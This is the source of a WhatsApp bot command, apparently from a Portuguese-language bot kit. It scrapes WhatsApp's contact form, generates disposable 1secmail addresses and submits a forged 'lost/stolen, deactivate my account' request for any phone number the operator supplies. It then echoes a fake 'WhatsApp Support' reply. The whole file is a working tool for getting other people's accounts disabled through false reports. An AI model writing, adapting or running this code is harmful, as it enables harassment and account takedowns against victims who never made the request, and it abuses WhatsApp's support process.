import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '*[❗] Insira o numero que deseja desativar o formato internacional, Exemplo: +1 (450) 555-555*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##\n\nOii,\n\nObrigado por tua mensagem.\n\nDesativamos sua conta do WhatsApp. Isso significa que sua conta está temporariamente desativada e será excluída automaticamente em 30 dias se você não registrar a conta novamente. Observação: o suporte ao cliente do WhatsApp não pode excluir sua conta manualmente.\n\nDurante o período de bloqueio:\n • Seus contatos no WhatsApp ainda poderão ver seu nome e foto do perfil.\n • Quaisquer mensagens que seus contatos enviarem para a conta permanecerão em status pendente por até 30 dias.\n\nSe você deseja recuperar sua conta, registre-a novamente o mais rápido possível.\nRegistre-se novamente inserindo o código de 6 dígitos, o código que você recebe por SMS ou telefonema. Se você se registrar novamente\n\nSe você tiver qualquer outra dúvida ou preocupação, sinta-se à vontade para nos contatar. Ficaremos felizes em ajudar!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##\n\nOii,:\n\nObrigado por tua mensagem.\n\nObrigado por sua mensagem.\n\nPara prosseguir com sua solicitação, precisamos que você verifique se este número de telefone pertence a você. Envie-nos a documentação que nos permita verificar a propriedade do número, como uma cópia de sua conta telefônica ou contrato de serviço.\n\nCertifique-se de inserir seu número de telefone no formato internacional completo. Para obter mais informações sobre o formato internacional, consulte este artigo.\n\nSe você tiver outras dúvidas ou preocupações, não hesite em nos contatar. Teremos o maior prazer em ajudá-lo.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true 
export default handler
